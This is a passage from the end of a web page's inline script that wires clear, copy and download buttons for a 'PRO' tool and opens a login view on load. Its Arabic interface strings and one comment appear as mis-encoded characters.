        clearBtnPro.onclick = () => { inputPro.value = "", listPro.innerHTML = "", showToast("ØªÙ… Ù…Ø³Ø­ Ù…Ø­ØªÙˆÙ‰ Ø£Ø¯Ø§Ø© PRO"); };
        setupCopyDownload(listPro, copyAllBtnPro, downloadBtnPro, "PRO");

        navigateTo('login'); 
    }
    
    // ØªØ´ØºÙŠÙ„ ÙˆØ¸ÙŠÙØ© Ø§Ù„ØªÙ‡ÙŠØ¦Ø©
    window.onload = initApp;

</script>
</body>
</html>
